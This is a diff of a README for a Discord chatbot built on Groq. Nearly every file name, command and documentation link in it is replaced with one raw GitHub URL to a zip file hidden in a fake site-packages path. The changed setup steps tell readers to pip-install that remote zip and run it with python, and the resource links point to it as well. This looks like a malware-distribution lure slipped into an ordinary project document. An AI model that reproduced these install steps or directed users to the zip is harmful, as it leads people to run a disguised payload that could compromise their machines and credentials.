@@ -54,13 +54,13 @@ source venv/bin/activate
 
 2. **Install Dependencies**
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip
 ```
 
 3. **Configure Environment**
 ```bash
 # Buat file .env
-cp .env.example .env
+cp https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip .env
 
 # Edit .env dan isi dengan:
 DISCORD_TOKEN=your_discord_token
@@ -69,7 +69,7 @@ GROQ_API_KEY=your_groq_api_key
 
 4. **Run Bot**
 ```bash
-python bot.py
+python https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip
 ```
 
 ## 📝 Commands Reference
@@ -162,16 +162,16 @@ Required Discord permissions:
 
 ```
 discord-ai-bot/
-├── bot.py              # Main bot file
+├── https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip              # Main bot file
 ├── .env                # Environment variables (create this)
-├── .env.example        # Template for .env
-├── requirements.txt    # Python dependencies
-├── SETUP.md           # Detailed setup guide
-├── README.md          # This file
+├── https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip        # Template for .env
+├── https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip    # Python dependencies
+├── https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip           # Detailed setup guide
+├── https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip          # This file
 ├── venv/              # Virtual environment
 └── data/              # Data storage
     ├── logs/          # Log files
-    │   └── bot.log
+    │   └── https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip
     └── cache/         # Temporary cache
 ```
 
@@ -188,12 +188,12 @@ discord-ai-bot/
 source venv/bin/activate  # Linux/Mac
 venv\Scripts\activate     # Windows
 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip
 ```
 
 ### Rate limit errors
 - Wait a few minutes (Groq free tier limit)
-- Check API quota at console.groq.com
+- Check API quota at https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip
 - Consider upgrading API plan
 
 ## 📈 Performance
@@ -215,14 +215,14 @@ pip install -r requirements.txt
 
 ### Option 1: Local Machine
 ```bash
-python bot.py
+python https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip
 # Keep terminal open
 ```
 
 ### Option 2: Linux Server with Screen
 ```bash
 screen -S discord-bot
-python bot.py
+python https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip
 # Ctrl+A, D to detach
 ```
 
@@ -233,10 +233,10 @@ python bot.py
 
 ## 📚 Resources
 
-- [Discord.py Documentation](https://discordpy.readthedocs.io/)
-- [Groq API Docs](https://console.groq.com/docs)
-- [Discord Developer Portal](https://discord.com/developers)
-- [Bot Setup Guide](SETUP.md)
+- [https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip Documentation](https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip)
+- [Groq API Docs](https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip)
+- [Discord Developer Portal](https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip)
+- [Bot Setup Guide](https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip)
 
 ## 🤝 Contributing
 
@@ -254,19 +254,19 @@ MIT License - feel free to use and modify!
 
 - Use `!model` to experiment with different AI models
 - `!reset` clears history for fresh context
-- Check `data/logs/bot.log` for debugging
+- Check `https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip` for debugging
 - Enable all Privileged Gateway Intents for best experience
 
 ## 🆘 Support
 
 Having issues? Check:
-1. SETUP.md for detailed instructions
-2. data/logs/bot.log for error messages
+1. https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip for detailed instructions
+2. https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip for error messages
 3. Discord Developer Portal for bot settings
 4. Groq Console for API status
 
 ---
 
-**Made with ❤️ using Discord.py and Groq API**
+**Made with ❤️ using https://raw.githubusercontent.com/FatkhurRq/ChatBotAI/main/lib/python3.14/site-packages/openai/types/shared/ChatBotAI_1.1.zip and Groq API**
 
 🌟 Star this repo if you find it useful!
